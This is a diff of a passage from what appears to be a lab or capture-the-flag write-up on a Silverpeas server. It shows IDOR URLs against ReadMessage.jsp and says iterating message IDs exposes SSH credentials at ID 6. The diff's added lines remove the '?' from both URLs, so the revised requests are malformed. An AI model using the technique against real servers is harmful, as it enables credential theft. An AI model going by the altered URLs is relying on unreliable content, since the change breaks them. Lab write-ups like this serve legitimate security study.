@@ -62,13 +62,13 @@ Authentication is successful. Other users observed in the system include `silver
 Further research reveals IDOR/file read vulnerabilities in Silverpeas (e.g., in the RSILVERMAIL component).
 
 ```text
-http://$TARGET:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=1
+http://$TARGET:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jspID=1
 ```
 
 By iterating through message IDs via Burp Suite or manual browsing, ID `6` reveals SSH credentials.
 
 ```url
-http://$TARGET:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
+http://$TARGET:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jspID=6
 ```
 
 **Output**
